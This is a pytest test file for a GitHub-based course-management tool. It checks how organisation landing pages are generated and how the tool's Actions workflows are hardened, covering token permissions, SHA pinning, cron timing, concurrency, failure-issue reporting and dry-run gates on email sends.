                "visibility": "PRIVATE",
                "description": "d",
                "topics": ["submission"],
            },
            {
                "name": "assignment-1",
                "url": "u",
                "visibility": "PRIVATE",
                "description": "d",
                "topics": ["assignment-template"],
            },
            {
                "name": "grades-ada",
                "url": "u",
                "visibility": "PRIVATE",
                "description": "d",
                "topics": ["gradebook"],
            },
            # the site repo is public anyway, and faculty need its "do not touch" row
            {
                "name": "org.github.io",
                "url": "u",
                "visibility": "PUBLIC",
                "description": "d",
                "topics": [],
            },
        ]
    )
    assert "welcome" in rows and "materials" in rows and "org.github.io" in rows
    assert "assignment-1-ada" not in rows
    assert "grades-ada" not in rows
    assert "| [assignment-1]" not in rows


def _readme_run(monkeypatch, put_ok):
    from dsl_course import profile_readme as P

    monkeypatch.setattr(P, "org_meta", lambda org: {})
    monkeypatch.setattr(P, "get_file_content", lambda *a, **k: None)
    monkeypatch.setattr(P, "list_org_repos", lambda org: _REPOS)
    monkeypatch.setattr(P, "discover_cohorts", lambda org: [])
    monkeypatch.setattr(P, "log", lambda *a, **k: None)
    said_ok: list[str] = []
    monkeypatch.setattr(P, "log_ok", lambda msg: said_ok.append(msg))
    monkeypatch.setattr(P, "log_err", lambda *a, **k: None)
    monkeypatch.setattr(P, "put_files", lambda *a, **k: put_ok)
    return P.update_profile_readme("Cohort-f2026", central_ref="release"), said_ok


def test_a_failed_readme_commit_is_counted_not_announced(monkeypatch):
    # The commit's return was discarded under an unconditional "refreshed" line, so the
    # nightly refresh could not see an org whose landing pages never converged.
    code, said_ok = _readme_run(monkeypatch, put_ok=False)
    assert code == 1
    assert said_ok == []


def test_a_written_readme_reports_no_failures(monkeypatch):
    code, said_ok = _readme_run(monkeypatch, put_ok=True)
    assert code == 0
    assert said_ok


def test_cohort_page_title_follows_the_course_pointer(monkeypatch):
    from dsl_course import profile_readme as P

    # A cohort's dsl-course.yml is a pointer with no course_name, so this used to title
    # the students' landing page with the org slug.
    monkeypatch.setattr(P, "org_meta", lambda org: {"course": "Course-Org"})
    monkeypatch.setattr(P, "course_name_of", lambda org: "Deep Learning")
    monkeypatch.setattr(P, "get_file_content", lambda *a, **k: None)
    monkeypatch.setattr(P, "list_org_repos", lambda org: _REPOS)
    monkeypatch.setattr(P, "discover_cohorts", lambda org: [])
    monkeypatch.setattr(P, "log", lambda *a, **k: None)
    monkeypatch.setattr(P, "log_ok", lambda *a, **k: None)
    written = {}
    monkeypatch.setattr(
        P, "put_files", lambda org, repo, files, msg, **k: written.update(files) or True
    )
    P.update_profile_readme("Cohort-f2026", central_ref="release")
    page = written["profile/README.md"].decode()
    assert "# Deep Learning" in page
    assert "# Cohort-f2026" not in page


def _cohort_readme(monkeypatch, existing):
    from dsl_course import profile_readme as P

    monkeypatch.setattr(P, "get_file_content", lambda *a, **k: existing)
    monkeypatch.setattr(P, "list_org_repos", lambda org: _REPOS)
    monkeypatch.setattr(P, "discover_cohorts", lambda org: [])
    monkeypatch.setattr(P, "log", lambda *a, **k: None)
    monkeypatch.setattr(P, "log_ok", lambda *a, **k: None)
    written = {}
    monkeypatch.setattr(
        P, "put_files", lambda org, repo, files, msg, **k: written.update(files) or True
    )
    P.update_profile_readme(
        "Cohort-f2026", "Org", "Deep Learning", central_ref="release"
    )
    return written


def test_cohort_page_is_seeded_whole_when_absent(monkeypatch):
    from dsl_course import profile_readme as P

    page = _cohort_readme(monkeypatch, None)["profile/README.md"].decode()
    assert "INSTRUCTOR-OWNED" in page
    assert P.TABLE_START in page and P.TABLE_END in page
    assert "front door" in page


def test_cohort_refresh_replaces_only_the_marked_table(monkeypatch):
    from dsl_course import profile_readme as P

    edited = (
        "# Our course, our words\n\nSee you Tuesdays in room 4.\n\n"
        f"{P.TABLE_START} -->\n| stale | rows |\n{P.TABLE_END}\n\nGood luck!\n"
    )
    page = _cohort_readme(monkeypatch, edited)["profile/README.md"].decode()
    assert "Our course, our words" in page  # prose above survives
    assert "See you Tuesdays in room 4." in page
    assert "Good luck!" in page  # and prose below
    assert "| stale | rows |" not in page  # the table alone is replaced
    assert "front door" in page


def test_cohort_refresh_leaves_any_page_without_markers_alone(monkeypatch):
    # No markers = wholly the instructor's, whether they deleted them or predate them.
    # There is no way to tell those apart from the bytes, so neither is overwritten.
    written = _cohort_readme(monkeypatch, "# Entirely mine\n\nNo markers here.\n")
    # The .github README still refreshes; the landing page is not written at all.
    assert set(written) == {"README.md"}


# --------------------------------------------- operational hardening, swept over every
# renderer. These are the properties nothing else would notice going missing: a workflow
# runs fine without a timeout or a failure notice, right up until the day it doesn't.


@pytest.mark.parametrize("name", sorted(ALL_RENDERED))
def test_every_workflow_drops_the_ambient_token_and_bounds_its_jobs(name):
    # Every job here authenticates with DSL_BOT_TOKEN and needs nothing from the ambient
    # GITHUB_TOKEN (the central repo it checks out is public), so that token is dropped to
    # zero scopes. And every job is bounded: an unbounded job that hangs holds the runner
    # for 6 hours and, behind a concurrency group, blocks everything queued behind it.
    #
    # The bound is asserted by VALUE, not merely as "an int": a blanket 30 across the estate
    # kills legitimate grading runs mid-cohort, and a timeout that fires on a healthy run is
    # itself the outage. check-team is a single API call, so it keeps its 5.
    doc = yaml.safe_load(ALL_RENDERED[name])
    assert doc["permissions"] == {}
    work = JOB_TIMEOUTS.get(name, DEFAULT_TIMEOUT)
    per_job = PER_JOB_TIMEOUTS.get(name, {})
    for job_name, job in doc["jobs"].items():
        want = CHECK_TEAM_TIMEOUT if job_name == "check-team" else work
        assert job.get("timeout-minutes") == per_job.get(job_name, want), (
            f"{name}.{job_name}"
        )
    assert set(per_job) <= set(doc["jobs"]), f"{name}: stale PER_JOB_TIMEOUTS entry"


@pytest.mark.parametrize("name", sorted(ALL_RENDERED))
def test_every_action_is_pinned_to_a_commit_sha(name):
    # These steps run in a job holding an org-owner PAT, and a tag is whatever the tag
    # currently points at.
    for ref in re.findall(r"uses: (\S+)", ALL_RENDERED[name]):
        assert re.fullmatch(r"[0-9a-f]{40}", ref.partition("@")[2]), ref


@pytest.mark.parametrize("name", sorted(ALL_RENDERED))
def test_no_run_block_interpolates_an_expression_directly(name):
    # GitHub substitutes ${{ }} BEFORE the shell parses a run block, so a value containing
    # shell metacharacters executes in a runner holding an org-owner PAT. Every value
    # reaches the script through env instead - swept across ALL renderers now, not only the
    # two buttons that happened to have a test.
    for job_name, job in yaml.safe_load(ALL_RENDERED[name])["jobs"].items():
        for step in job.get("steps", []):
            assert "${{" not in step.get("run", ""), (
                f"{name}.{job_name}: {step.get('name')}"
            )


def test_the_cron_set_is_exactly_what_declares_a_schedule():
    # Keeps CRONS honest: a renderer that grows a `schedule:` must pass the notification
    # test below, not quietly join the set of unwatched jobs.
    assert {n for n, r in ALL_RENDERED.items() if "schedule" in _trigger(r)} == CRONS


@pytest.mark.parametrize("name", sorted(CRONS))
def test_no_cron_sits_on_a_contended_minute(name):
    # GitHub delivers `schedule` best-effort and drops the most contended minutes first.
    # Minutes 0/15/30/45 are where everyone puts their crons: on `0 * * * *` the scheduler
    # was delivered 6 ticks a day rather than 24, identically across all four course orgs,
    # so a release pinned to a class time landed hours late. Odd minutes cost nothing.
    for entry in _trigger(ALL_RENDERED[name])["schedule"]:
        for minute in entry["cron"].split()[0].split(","):
            assert minute.isdigit(), (
                f"{name}: {entry['cron']} - spell the minutes out; a step like */15 "
                "puts a tick back on minute 0"
            )
            assert int(minute) not in (0, 15, 30, 45), f"{name}: {entry['cron']}"


def test_the_daily_crons_each_own_their_own_minute():
    # The daily jobs are a CHAIN: refresh converges workflows and secrets, then sync
    # membership mirrors the teams that sync site reads for gating. Membership and site
    # were both `0 6 * * *` in one repo under one token, i.e. racing - which is how a site
    # syncs against teams that have not been written yet. Distinct slots order the chain.
    slots = [
        (name, entry["cron"])
        for name in sorted(CRONS)
        for entry in _trigger(ALL_RENDERED[name])["schedule"]
        if entry["cron"].split()[1] != "*"  # daily, not the quarter-hourly scheduler
    ]
    when = [tuple(cron.split()[:2]) for _, cron in slots]
    assert len(set(when)) == len(when), slots


def _issue_title(step: dict) -> str:
    """The failure-issue title a reporting step builds, as the shell literal it assigns."""
    return re.search(r'^ *title=(".*")$', step["run"], re.MULTILINE).group(1)


def _assert_reports_a_failure(opener: dict) -> None:
    # An issue is the only channel that reaches a human: the scheduled-failure email goes
    # to the bot. One open issue tracks the current state - opened/commented on failure,
    # closed by the next green run.
    assert "gh issue create" in opener["run"]
    # The title is the workflow's own ambient name, so each keeps its own issue (a shared
    # title would let one recovery close another's open failure) with no mirrored string.
    # A workflow whose unattended jobs run CONCURRENTLY scopes it further - the scheduler's
    # grading job names the cohort it grades - because there the sibling that closes the
    # issue is the one that just went green.
    assert opener["env"]["WORKFLOW"] == "${{ github.workflow }}"
    assert re.fullmatch(r'"\$WORKFLOW( \([^"]+\))? is failing"', _issue_title(opener))
    # An issue emails only the repo's watchers, so the body mentions the org's admins -
    # derived from the owner half of $REPO, and course-admin rather than instructors
    # because broken infrastructure is not the teaching staff's problem.
    assert "cc @%s/course-admin" in opener["run"]
    assert '"${REPO%%/*}"' in opener["run"]
    assert opener["env"]["REPO"] == "${{ github.repository }}"
    # ...on the FIRST report only. A repeat comment posts $note, the same text without
    # the mention: whoever it reached the first time is already subscribed to the thread.
    assert opener["run"].count('--body "$body"') == 1
    assert '--body "$note"' in opener["run"]
    # And a repeat waits for the thread to have been quiet for six hours. The scheduler
    # fails on every tick while a fault stands, so an unthrottled comment buried the
    # issue and mentioned course-admin dozens of times a day about the one fault.
    assert "updatedAt" in opener["run"]
    assert "21600" in opener["run"]
    # A job killed by its own `timeout-minutes` is CANCELLED, not failed - and a cron that
    # reliably runs out of time is exactly the silent failure this exists to surface.
    assert "cancelled()" in opener["if"]
    # A manual run's failure is already in front of the person who clicked.
    assert "github.event_name != 'workflow_dispatch'" in opener["if"]
    # A transient search failure must not abort the step BEFORE it files anything (the
    # step runs under `bash -e`, so an unguarded capture would).
    assert ") || true" in opener["run"]
    # `permissions: {}` leaves the ambient token unable to file anything.
    assert opener["env"]["GH_TOKEN"] == "${{ secrets.DSL_BOT_TOKEN }}"


# Two OPEN issues whose titles the search cannot tell apart: every word of the release
# job's title is in the grading job's.
_OPEN_ISSUES = [
    {
        "number": 11,
        "title": "Scheduled release is failing",
        "updatedAt": "2020-01-01T00:00:00Z",
    },
    {
        "number": 22,
        "title": "Scheduled release (autograde Cohort-f2026) is failing",
        "updatedAt": "2020-01-01T00:00:00Z",
    },
]


def _run_issue_step(
    step: dict, work: Path, issues: list[dict], **env: str
) -> list[str]:
    """Execute a reporting step's script for real, against a fixed set of OPEN issues.

    `gh` is faked, and the fake applies the `--jq` filter itself because that is what gh
    does - which is the whole point: the matching semantics live in that filter, and a
    test that only compares title strings cannot see them. Returns the issue commands the
    script made, in order."""
    if not shutil.which("jq"):  # pragma: no cover - present on every CI runner
        pytest.skip("jq is what applies gh's --jq filter")
    work.mkdir(parents=True, exist_ok=True)
    (work / "issues.json").write_text(json.dumps(issues))
    fake = work / "gh"
    fake.write_text(
        "#!/bin/sh\n"
        'case "$1 $2" in\n'
        '  "issue close"|"issue comment"|"issue create") echo "$2 $3" >>"$LOG"; exit 0 ;;\n'
        "esac\n"
        "while [ $# -gt 0 ]; do\n"
        '  [ "$1" = "--jq" ] && filter="$2"\n'
        "  shift\n"
        "done\n"
        'jq -r "$filter" "$ISSUES"\n'
    )
    fake.chmod(0o755)
    log = work / "gh.log"
    log.write_text("")
    subprocess.run(
        # `bash -e`, which is how GitHub runs a `run:` block.
        ["bash", "-e", "-c", step["run"]],
        env={
            "PATH": f"{work}:{os.environ['PATH']}",
            "LOG": str(log),
            "ISSUES": str(work / "issues.json"),
            "WORKFLOW": "Scheduled release",
            "REPO": "Course-Org/.github",
            "RUN_URL": "https://example.invalid/run/1",
            **env,
        },
        capture_output=True,
        text=True,
        check=True,
    )
    return [line for line in log.read_text().splitlines() if line]


def test_a_recovery_closes_only_the_issue_its_own_job_filed(tmp_path):
    # `--search` is a WORD match, so the release job's title is a subset of the grading
    # job's. Without an exact client-side match every green release tick closed the open
    # grading issues, the still-failing leg refiled with a fresh cc, and the 6h throttle
    # never engaged - ~96 mentions a day per faulty cohort.
    jobs = yaml.safe_load(ALL_RENDERED["scheduler"])["jobs"]
    release_closer = next(
        s for s in jobs["release"]["steps"] if s.get("if") == "success()"
    )
    assert _run_issue_step(release_closer, tmp_path / "r", _OPEN_ISSUES) == ["close 11"]
    grading_closer = next(
        s for s in jobs["autograde"]["steps"] if s.get("if") == "success()"
    )
    assert _run_issue_step(
        grading_closer, tmp_path / "a", _OPEN_ISSUES, COHORT="Cohort-f2026"
    ) == ["close 22"]


def test_a_failure_files_its_own_issue_rather_than_commenting_on_a_sibling(tmp_path):
    # The same match on the dedupe lookup. Reading a sibling's issue as "already open"
    # would leave the release failure reported nowhere - it would comment on a grading
    # thread nobody watching releases is subscribed to.
    opener = next(
        s
        for s in yaml.safe_load(ALL_RENDERED["scheduler"])["jobs"]["release"]["steps"]
        if "failure()" in s.get("if", "")
    )
    grading_only = [i for i in _OPEN_ISSUES if "autograde" in i["title"]]
    assert _run_issue_step(opener, tmp_path / "x", grading_only) == ["create --repo"]
    # ...and it comments on the one that IS its own (an old timestamp, so not throttled).
    assert _run_issue_step(opener, tmp_path / "y", _OPEN_ISSUES) == ["comment 11"]


@pytest.mark.parametrize("name", sorted(CRONS))
def test_every_cron_files_and_closes_its_own_failure_issue(name):
    doc = yaml.safe_load(ALL_RENDERED[name])
    reporting = [
        (n, j)
        for n, j in doc["jobs"].items()
        if any("failure()" in s.get("if", "") for s in j.get("steps", []))
    ]
    assert reporting, f"{name}: nothing reports its unattended failures"
    for job_name, job in reporting:
        openers = [s for s in job["steps"] if "failure()" in s.get("if", "")]
        # ONE per job. The scheduler releases and grades in two CONCURRENT jobs, so the
        # contract is per job now - but two notices in one job still double-file.
        assert len(openers) == 1, f"{name}.{job_name}"
        (opener,) = openers
        # ...and the job is UNGATED. check-team only runs on workflow_dispatch, so a job
        # that needs it is SKIPPED on the cron - parking the notice on a trailing gated job
        # would report nothing at all, silently.
        assert "check-team" not in str(job.get("needs", "")), (
            f"{name}: the notice rides {job_name}, which is skipped on the cron"
        )
        _assert_reports_a_failure(opener)

    # "Fix it and re-run" is how a human confirms the recovery, so EVERY job a human can
    # dispatch closes the ticket too - not just the schedule-gated one carrying the notice.
    closers = {
        n
        for n, j in doc["jobs"].items()
        if any(s.get("if") == "success()" for s in j.get("steps", []))
    }
    assert closers == set(doc["jobs"]) - {"check-team"}
    for closer_job in closers:
        closer = next(
            s for s in doc["jobs"][closer_job]["steps"] if s.get("if") == "success()"
        )
        assert "gh issue close" in closer["run"]
        # A job closes exactly the title it FILES, or a recovery closes nothing - and,
        # worse, on a workflow whose jobs run at once it would close a sibling's
        # still-standing failure instead of its own.
        own = dict(reporting).get(closer_job)
        want = (
            _issue_title(
                next(s for s in own["steps"] if "failure()" in s.get("if", ""))
            )
            if own
            else '"$WORKFLOW is failing"'
        )
        assert _issue_title(closer) == want, f"{name}.{closer_job}"


def test_only_the_nightly_refresh_joins_the_seed_refresh_group():
    # Derived, not listed: every renderer that actually runs a refresh is accounted for
    # here, so a new entry point has to make this decision rather than inherit it.
    assert {n for n, r in ALL_RENDERED.items() if "seed refresh" in r} == SEED_REFRESH
    for name in sorted(SEED_REFRESH):
        doc = yaml.safe_load(ALL_RENDERED[name])
        if name in SEED_REFRESH_GROUPED:
            # The nightly cron serialises against ITSELF: two passes race each other into
            # sha conflicts and leave orgs half-converged.
            assert doc["concurrency"] == {
                "group": "seed-refresh",
                "cancel-in-progress": False,
            }, name
        else:
            # The BUTTONS stay out of it, deliberately. Actions concurrency has no `queue:`
            # - a group holds exactly ONE pending run, so a third arrival cancels the
            # second whatever `cancel-in-progress` says. An operator's click must never be
            # silently cancelled; a button racing the nightly refresh can at worst take a
            # put_file 409, which is red, visible, and healed by the next converge.
            assert "concurrency" not in doc, (
                f"{name} is an operator button - a shared group would silently cancel it"
            )


# Every renderer that WRITES shared state, and the group name it must serialise under.
# Listed rather than derived, because the decision is per workflow: a second overlapping
# run of any of these races the first into sha conflicts, a clobbered force-push, or a
# half-reconciled team. Read-only buttons (Check cohort setup) are deliberately absent.
SERIALISED_WRITERS = {
    "release": "release-materials",
    "central_release": "release-materials",
    "provision": "release-assignment",
    "collect_submissions": "collect-submissions",
    "distribute_grades": "distribute-grades",
    # Two overlapping Send-codes runs generate two codes for the same blank cell: one is
    # written and the other is emailed, so that student's code enrols nobody. Scoped PER
    # COHORT, because that raced state is one cohort's students.csv: a roster push in one
    # cohort must not drop a queued send in another (a group holds one pending run, and a
    # third arrival cancels the second).
    "send_codes": "send-codes-${{ github.event.client_payload.cohort_org }}",
    "sync_membership": "sync-membership",
    "sync_site": "sync-site",
    "publish_site": "publish-course-website",
}


@pytest.mark.parametrize("name", sorted(SERIALISED_WRITERS))
def test_every_writer_serialises_against_itself_per_repo(name):
    doc = yaml.safe_load(ALL_RENDERED[name])
    assert doc.get("concurrency") == {
        "group": "${{ github.repository }}-" + SERIALISED_WRITERS[name],
        "cancel-in-progress": False,
    }, f"{name} can overlap itself"


def test_no_button_joins_the_scheduled_release_group():
    # The scheduler's group guards FIRE-ONCE actions and can outlive its slot. A button
    # sharing it would be the third arrival that Actions silently drops - and a deliberate
    # re-grade that never ran is worse than one that races the cron, which the autograde
    # marker already makes safe. Job-level groups are swept too: the scheduler moved its
    # own there, so a workflow-level-only sweep would have stopped seeing them.
    grouped = {
        n
        for n, r in ALL_RENDERED.items()
        for group in [
            (yaml.safe_load(r).get("concurrency") or {}).get("group", ""),
            *(
                (j.get("concurrency") or {}).get("group", "")
                for j in yaml.safe_load(r)["jobs"].values()
            ),
        ]
        if "scheduled-release" in str(group) or "scheduled-autograde" in str(group)
    }
    assert grouped == {"scheduler"}


def test_the_scheduler_serialises_each_job_and_nothing_more():
    # No workflow-level group: that was ONE queue for every action in every cohort, and a
    # two-hour grading pass in one cohort then held up a release due in another. Each job
    # declares its own instead.
    doc = yaml.safe_load(ALL_RENDERED["scheduler"])
    assert "concurrency" not in doc
    jobs = doc["jobs"]
    # Releases are fire-once, so a tick arriving mid-pass still queues behind one - but a
    # manual DRY-RUN writes nothing, and joining that queue is how an operator's preview
    # gets silently dropped (a group holds one pending run; a third arrival cancels it).
    assert jobs["release"]["concurrency"] == {
        "group": "${{ inputs.dry_run == true && github.run_id || 'scheduled-release' }}",
        "cancel-in-progress": False,
    }
    # Grading queues PER COHORT: the fire-once marker is a cohort-side file, and a pass
    # over another cohort shares nothing with it. A dry-run leg is per run and per cohort,
    # for the same reason the release job's is.
    assert jobs["autograde"]["concurrency"] == {
        "group": (
            "${{ inputs.dry_run == true && format('{0}-{1}', github.run_id, "
            "matrix.cohort) || format('scheduled-autograde-{0}', matrix.cohort) }}"
        ),
        "cancel-in-progress": False,
    }
    for job in jobs.values():
        assert job["concurrency"]["cancel-in-progress"] is False


def test_the_scheduler_grades_every_cohort_without_waiting_on_the_releases():
    jobs = yaml.safe_load(ALL_RENDERED["scheduler"])["jobs"]
    autograde = jobs["autograde"]
    # It needs the release job only for the cohort LIST, so it must run whatever became of
    # the releases: grading is gated on the durable snapshot marker, not on this run.
    assert autograde["needs"] == ["release"]
    assert autograde["if"].startswith("always()")
    # ...but not on an empty list: GitHub errors on a matrix with no vectors, and a course
    # org with no cohorts registered yet is a normal state, not a failure.
    assert "needs.release.outputs.cohorts != '[]'" in autograde["if"]
    assert "needs.release.outputs.cohorts != ''" in autograde["if"]
    assert jobs["release"]["outputs"] == {
        "cohorts": "${{ steps.cohorts.outputs.cohorts }}"
    }
    steps = jobs["release"]["steps"]
    lister = next(s for s in steps if s.get("id") == "cohorts")
    assert "--list-cohorts" in lister["run"]
    # And it is listed BEFORE the release pass runs: a failed step skips the ones after
    # it, so listing afterwards would let one cohort's release fault skip everyone's
    # grading - on a run that has already reported the release failure and moved on.
    releaser = next(s for s in steps if "--all-cohorts" in str(s.get("run", "")))
    assert steps.index(lister) < steps.index(releaser)
    assert autograde["strategy"] == {
        "fail-fast": False,  # one cohort's grading failure cancels nobody else's
        "matrix": {"cohort": "${{ fromJSON(needs.release.outputs.cohorts) }}"},
    }
    # Each job runs its own half, and only its own half.
    assert "--skip-autograde" in str(jobs["release"]["steps"])
    assert "--autograde-only" in str(autograde["steps"])


def test_scheduler_accepts_an_external_dispatch():
    # GitHub delivers a fraction of its `schedule` fires (measured 2-7%, gaps to 13h), so
    # the same workflow is also driven from outside by repository_dispatch - each driver
    # covering the other's outage. The cron is untouched.
    trigger = _trigger(ALL_RENDERED["scheduler"])
    assert trigger["repository_dispatch"]["types"] == ["scheduled-release"]
    assert trigger["schedule"] == [{"cron": "7,22,37,52 * * * *"}]
    assert set(trigger) == {"schedule", "repository_dispatch", "workflow_dispatch"}
    # Which driver delivered the tick is in the run log, and nowhere else - a dispatch
    # names its sender, the cron has nobody to name. `inputs.dry_run` is empty on both
    # unattended paths, so the existing gate leaves them as real runs.
    step = next(
        s
        for s in yaml.safe_load(ALL_RENDERED["scheduler"])["jobs"]["release"]["steps"]
        if "DRIVER" in (s.get("env") or {})
    )
    assert step["env"]["DRIVER"] == "${{ github.event.client_payload.driver }}"
    assert step["env"]["EVENT"] == "${{ github.event_name }}"
    assert "$EVENT" in step["run"] and "DRIVER" in step["run"]


def test_the_scheduler_installs_the_autograder_it_runs():
    # The scheduler autogrades at every passed deadline through the SAME preamble as
    # every other workflow, which installs requirements.txt and nothing else. When pytest
    # lived only in the manual grading step, `python -m pytest` was "No module
    # named pytest" on the cron: silent zeros for the whole cohort, no sentinel, and the
    # same red run every hour for the rest of the term.
    steps = yaml.safe_load(ALL_RENDERED["scheduler"])["jobs"]["autograde"]["steps"]
    installs = [s["run"] for s in steps if "pip install -r " in str(s.get("run", ""))]
    assert installs, "the grading job installs nothing - it cannot grade"
    for run in installs:
        req = ROOT / run.split("pip install -r ")[1].split()[0]
        pinned = req.read_text()
        assert re.search(r"^pytest==", pinned, re.MULTILINE), (
            f"{req.name} does not pin pytest"
        )
        assert re.search(r"^nbconvert==", pinned, re.MULTILINE), (
            f"{req.name} does not pin nbconvert - a notebook submission cannot be graded"
        )


def test_update_profile_readme_raises_clearly_on_a_malformed_config(
    monkeypatch, capsys
):
    from dsl_course import profile_readme as P

    monkeypatch.setattr(
        "dsl_course.gh_contents.get_file_content",
        lambda *a, **k: "course_name: [unclosed\n",
    )
    with pytest.raises(yaml.YAMLError):
        P.update_profile_readme("Course-Org", central_ref="release")
    assert "malformed YAML" in capsys.readouterr().err


def test_a_renamed_orgs_profile_page_stops_naming_the_dead_org():
    # Renaming an org leaves every self-reference in its own profile page pointing at a
    # name that no longer resolves - including the Join link, so a student cannot enrol.
    page = (
        "# hertie-nlp-e1282-f2026.\n\n"
        "Welcome! This is the course organisation for **hertie-nlp-e1282-f2026**.\n\n"
        "**[hertie-nlp-e1282-f2026 - course website]"
        "(https://hertie-nlp-e1282-f2026.github.io/)** - schedule,\n"
        "[`welcome`](https://github.com/hertie-nlp-e1282-f2026/welcome/issues/new/choose)"
        " to enrol\n"
    )
    out, was = profile_readme.retitle_renamed_org(page, "hertie-nlp-f2026")
    assert was == "hertie-nlp-e1282-f2026"
    assert "e1282-f2026" not in out
    assert out.count("hertie-nlp-f2026") == 5  # heading, prose, link text, both URLs


def test_a_page_already_naming_its_own_org_is_untouched():
    page = "# hertie-nlp-f2026.\n\nWelcome to **hertie-nlp-f2026**.\n"
    assert profile_readme.retitle_renamed_org(page, "hertie-nlp-f2026") == (page, None)


def test_an_instructor_retitled_page_is_left_alone():
    # The signal is the H1 naming an org that is not this one. A human title matches
    # nothing, so prose someone has made their own is never rewritten - which is the
    # difference between this and "the page still looks generated", the heuristic
    # _cohort_profile_body's docstring rejects.
    page = (
        "# NLP, Autumn 2026\n\nSee hertie-nlp-e1282-f2026 for last year's materials.\n"
    )
    assert profile_readme.retitle_renamed_org(page, "hertie-nlp-f2026") == (page, None)


def test_a_renamed_org_is_corrected_even_with_no_repo_table_markers():
    # A marker-less page is otherwise left entirely alone (the instructor owns it), but a
    # dead Join link costs a student their enrolment - so the name is still corrected.
    page = "# old-org-f2026.\n\nJoin at https://github.com/old-org-f2026/welcome\n"
    monkey = {"profile/README.md": page}
    original = profile_readme.get_file_content
    profile_readme.get_file_content = lambda org, repo, path: monkey.get(path)
    try:
        out = profile_readme._cohort_profile_body("new-org-f2026", [], "SEEDED")
    finally:
        profile_readme.get_file_content = original
    assert out is not None, "a rename must still be written even with no markers"
    assert "old-org-f2026" not in out


# --------------------------------------------------------- the workflows that send email

# Everything that can put an email on the wire: the codes send, off a roster push, and
# Distribute grades, the one button left that emails a whole cohort.
MAIL_SENDERS = ("send_codes", "distribute_grades")

# Everything whose job env must carry the transport secrets. Check cohort setup sends
# nothing - it REPORTS whether a send could (status' mail-transport row reads the very
# same variables through `mailer.graph_config_from_env`), and a workflow that does not
# carry them would report "unset" on every org whatever the truth. That is the exact
# fiction an unattended codes send leans on when it says a person will read the row.
MAIL_ENV_CARRIERS = MAIL_SENDERS + ("status",)


def test_the_one_mail_button_left_defaults_to_a_dry_run():
    # The entire safety rail on a button that emails a whole cohort, and until now it was
    # asserted nowhere: a renderer edit flipping it would have been green. Send enrolment
    # codes has no button and no preview at all - a roster push is what fires it.
    dry_run = workflow_inputs(ALL_RENDERED["distribute_grades"])["dry_run"]
    assert dry_run["type"] == "boolean"
    assert dry_run["default"] is True


@pytest.mark.parametrize("name", ["distribute_grades"])
@pytest.mark.parametrize(
    "value", ["", "true", "True", "TRUE", "yes", "1", " false", "false"]
)
def test_the_dry_run_gate_is_fail_closed_under_bash(name, value, tmp_path):
    # Executed, not string-matched: `[ "$DRY_RUN" = "true" ] && args+=(--dry-run)` sent for
    # real on ANY value that was not the exact lowercase string - "True", "1", a blank from
    # a renamed input. Only an explicit `false` may send.
    gate = next(
        line.strip()
        for line in ALL_RENDERED[name].splitlines()
        if "--no-dry-run" in line
    )
    script = f'args=()\n{gate}\nprintf "%s\\n" "${{args[@]}}"'
    out = subprocess.run(
        ["bash", "-euo", "pipefail", "-c", script],
        env={"DRY_RUN": value, "PATH": os.environ["PATH"]},
        capture_output=True,
        text=True,
        check=True,
    ).stdout
    expected = "--no-dry-run" if value == "false" else "--dry-run"
    assert out.strip() == expected


@pytest.mark.parametrize("name", MAIL_ENV_CARRIERS)
def test_every_mail_sender_carries_every_transport_secret(name):
    # Nothing tied the workflow's env to the names `mailer` actually reads, so a rename
    # reached production as a silently unconfigured org rather than a red CI. The codes
    # send is here for a worse version of the same failure: without the secrets an
    # unattended run off a roster push goes green and mails nobody.
    env = workflow_jobs(ALL_RENDERED[name])
    step_env: dict = {}
    for job in env.values():
        for step in job.get("steps", []):
            step_env.update(step.get("env") or {})
    assert set(mailer.GRAPH_ENV) <= set(step_env)
